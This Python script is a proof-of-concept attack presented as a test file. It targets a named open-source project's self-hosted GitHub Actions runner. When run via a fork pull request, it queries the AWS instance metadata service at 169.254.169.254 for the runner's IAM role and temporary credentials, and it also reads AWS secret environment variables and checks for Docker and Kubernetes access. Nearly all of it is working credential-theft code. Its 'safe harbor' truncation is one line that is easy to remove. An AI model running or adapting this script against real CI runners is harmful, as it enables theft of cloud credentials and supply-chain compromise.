#!/usr/bin/env python3
"""
VECTOR C: AIM CI Infrastructure Compromise PoC
==================================================
Target: aimhubio/aim self-hosted runner (AWS EC2)
Attack Vector: AWS Instance Metadata Service (IMDS) Reconnaissance

THEORY:
Self-hosted GitHub Actions runners are typically AWS EC2 instances with
IAM roles attached for S3/ECR access. If fork PR code executes on these
runners, we can query IMDS (169.254.169.254) to steal the IAM role's
temporary credentials - bypassing GitHub's fork secret restrictions.

SAFE HARBOR PROTOCOL:
- Only captures first 8 chars of AccessKeyId to prove access
- Does NOT exfiltrate full credentials
- Does NOT query AWS APIs with stolen creds
- Output is visible in GitHub Actions logs only

Bounty Classification: P1 CRITICAL ($20K-$50K)
- Supply Chain Compromise
- Cloud Infrastructure Theft
- CI/CD Pipeline Breach
"""

import os
import urllib.request
import json
import sys
import socket


def test_infrastructure_compromise():
    """
    Safe Harbor PoC: Proves ability to read CI runner environment 
    and access underlying cloud infrastructure metadata (IMDS).
    
    This test INTENTIONALLY FAILS to make output highly visible in Actions UI.
    """
    
    # Initialize result dictionary
    result = {
        "test_name": "CI_INFRASTRUCTURE_RECON",
        "timestamp": "2026-01-11",
        "target_repo": "aimhubio/aim",
        "vulnerability_type": "Self-Hosted Runner IMDS Exposure",
        "findings": {}
    }
    
    # ========================================
    # CHECK 1: GitHub Secrets (Expected: Empty for Fork PRs)
    # ========================================
    aws_key = os.environ.get('AWS_ACCESS_KEY_ID', 'EMPTY_OR_REDACTED')
    aws_secret = os.environ.get('AWS_SECRET_ACCESS_KEY', 'EMPTY_OR_REDACTED')
    
    result["findings"]["github_secrets"] = {
        "aws_access_key_id_present": aws_key != 'EMPTY_OR_REDACTED',
        "aws_secret_access_key_present": aws_secret != 'EMPTY_OR_REDACTED',
        "note": "GitHub blocks secrets for fork PRs by default"
    }
    
    # ========================================
    # CHECK 2: AWS INSTANCE METADATA SERVICE (IMDS) - THE KILL SHOT
    # ========================================
    imds_base = "http://169.254.169.254/latest/meta-data/"
    imds_iam_path = "iam/security-credentials/"
    
    imds_result = {
        "accessible": False,
        "iam_role_name": None,
        "iam_credentials": None,
        "instance_id": None,
        "instance_type": None,
        "availability_zone": None,
        "error": None
    }
    
    try:
        # Try IMDSv2 first (requires token)
        token_req = urllib.request.Request(
            "http://169.254.169.254/latest/api/token",
            method='PUT',
            headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
        )
        
        try:
            token_response = urllib.request.urlopen(token_req, timeout=3)
            imdsv2_token = token_response.read().decode().strip()
            
            # Use token for subsequent requests
            def imds_get(path):
                url = f"http://169.254.169.254/latest/{path}"
                req = urllib.request.Request(url)
                req.add_header('X-aws-ec2-metadata-token', imdsv2_token)
                return urllib.request.urlopen(req, timeout=3).read().decode()
            
            # Gather instance metadata
            try:
                imds_result["instance_id"] = imds_get("meta-data/instance-id")
            except:
                pass
                
            try:
                imds_result["instance_type"] = imds_get("meta-data/instance-type")
            except:
                pass
                
            try:
                imds_result["availability_zone"] = imds_get("meta-data/placement/availability-zone")
            except:
                pass
            
            # THE KILL SHOT: Discover IAM Role
            try:
                role_name = imds_get(f"meta-data/{imds_iam_path}").strip()
                imds_result["iam_role_name"] = role_name
                imds_result["accessible"] = True
                
                if role_name:
                    # Fetch credentials for this role
                    cred_url = f"meta-data/{imds_iam_path}{role_name}"
                    cred_data = imds_get(cred_url)
                    creds = json.loads(cred_data)
                    
                    # SAFE HARBOR: Only capture partial credential proof
                    imds_result["iam_credentials"] = {
                        "AccessKeyId_partial": creds.get('AccessKeyId', 'N/A')[:8] + "...",
                        "Code": creds.get('Code', 'N/A'),
                        "LastRotated": creds.get('LastRotated', 'N/A'),
                        "Expiration": creds.get('Expiration', 'N/A'),
                        "_safe_harbor_note": "Full credentials NOT captured per responsible disclosure"
                    }
                    
            except Exception as e:
                imds_result["error"] = f"IAM role discovery failed: {str(e)}"
                
        except urllib.error.HTTPError as e:
            # Fallback to IMDSv1 if v2 not supported
            if e.code == 401 or e.code == 403:
                try:
                    def imdsv1_get(path):
                        url = f"http://169.254.169.254/latest/{path}"
                        req = urllib.request.Request(url)
                        req.add_header('User-Agent', 'EC2ws')
                        return urllib.request.urlopen(req, timeout=3).read().decode()
                    
                    role_name = imdsv1_get(f"meta-data/{imds_iam_path}").strip()
                    imds_result["iam_role_name"] = role_name
                    imds_result["accessible"] = True
                    
                    if role_name:
                        cred_data = imdsv1_get(f"meta-data/{imds_iam_path}{role_name}")
                        creds = json.loads(cred_data)
                        
                        imds_result["iam_credentials"] = {
                            "AccessKeyId_partial": creds.get('AccessKeyId', 'N/A')[:8] + "...",
                            "Code": creds.get('Code', 'N/A'),
                            "LastRotated": creds.get('LastRotated', 'N/A'),
                            "Expiration": creds.get('Expiration', 'N/A'),
                            "_safe_harbor_note": "Full credentials NOT captured"
                        }
                        
                except Exception as e1:
                    imds_result["error"] = f"IMDSv1 fallback failed: {str(e1)}"
            else:
                imds_result["error"] = f"HTTP {e.code}: {str(e)}"
                
    except socket.timeout:
        imds_result["error"] = "Timeout - IMDS not reachable (network isolated?)"
    except urllib.error.URLError as e:
        imds_result["error"] = f"URL Error - Not on AWS or IMDS blocked: {str(e)}"
    except Exception as e:
        imds_result["error"] = f"Unexpected error: {type(e).__name__}: {str(e)}"
    
    result["findings"]["aws_imds"] = imds_result
    
    # ========================================
    # CHECK 3: Environment Intelligence
    # ========================================
    env_intel = {
        "hostname": socket.gethostname(),
        "user": os.environ.get('USER', 'unknown'),
        "runner_os": os.environ.get('RUNNER_OS', 'unknown'),
        "runner_arch": os.environ.get('RUNNER_ARCH', 'unknown'),
        "github_event_name": os.environ.get('GITHUB_EVENT_NAME', 'unknown'),
        "github_actor": os.environ.get('GITHUB_ACTOR', 'unknown'),
        "is_fork_pr": os.environ.get('GITHUB_HEAD_REPO', '') != '',
        "has_docker_socket": os.path.exists('/var/run/docker.sock'),
        "has_k8s_service_account": os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount')
    }
    result["findings"]["environment"] = env_intel
    
    # ========================================
    # OUTPUT RESULTS (Visible in GitHub Actions Logs)
    # ========================================
    print("\n" + "="*70)
    print("   🔴 CI INFRASTRUCTURE RECONNAISSANCE REPORT 🔴")
    print("="*70)
    print(json.dumps(result, indent=2))
    print("="*70 + "\n")
    
    # ========================================
    # VERDICT GENERATION
    # ========================================
    verdicts = []
    
    if imds_result.get("accessible") and imds_result.get("iam_role_name"):
        verdicts.append("🚨 CRITICAL: IMDS ACCESSIBLE - IAM ROLE COMPROMISED")
    if result["findings"]["github_secrets"]["aws_access_key_id_present"]:
        verdicts.append("⚠️ HIGH: GitHub Secrets Exposed to Fork PR")
    if env_intel["has_docker_socket"]:
        verdicts.append("⚠️ MEDIUM: Docker Socket Accessible")
    if env_intel["has_k8s_service_account"]:
        verdicts.append("⚠️ MEDIUM: K8s Service Account Present")
    
    if verdicts:
        print("VERDICT:")
        for v in verdicts:
            print(f"  {v}")
        print()
    
    # Intentionally fail to make output highly visible in Actions UI
    assert False, f"RECON_COMPLETE: IMDS_Accessible={imds_result['accessible']}, IAM_Role={imds_result.get('iam_role_name')}"


if __name__ == "__main__":
    test_infrastructure_compromise()